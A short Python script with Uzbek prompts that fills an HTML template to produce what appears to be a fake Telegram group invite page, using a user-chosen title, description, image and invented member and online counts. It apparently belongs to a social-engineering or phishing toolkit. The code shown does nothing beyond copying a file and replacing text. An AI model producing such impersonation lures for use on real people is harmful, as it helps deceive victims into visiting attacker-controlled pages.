#!/usr/bin/env python3

import os
import shutil

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = input(G + '[+]' + C + ' Guruh nomi : ' + W)
desc = input(G + '[+]' + C + ' Guruh haqida ma`lumot : ' + W)
image = input(G + '[+]' + C + ' Rasmga yo`l(o`lchami maximum : 300x300) : ' + W)
mem_num = input(G + '[+]' + C + ' A`zolar soni: ' + W)
online_num = input(G + '[+]' + C + ' Online a`zolar soni : ' + W)

img_name = image.split('/')[-1]
try:
    shutil.copyfile(image, 'template/telegram/images/{}'.format(img_name))
except Exception as e:
    print('\n' + R + '[-]' + C + ' Mustasno : ' + W + str(e))
    exit()

with open('template/telegram/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/telegram/index.html', 'w') as new_index:
    new_index.write(code)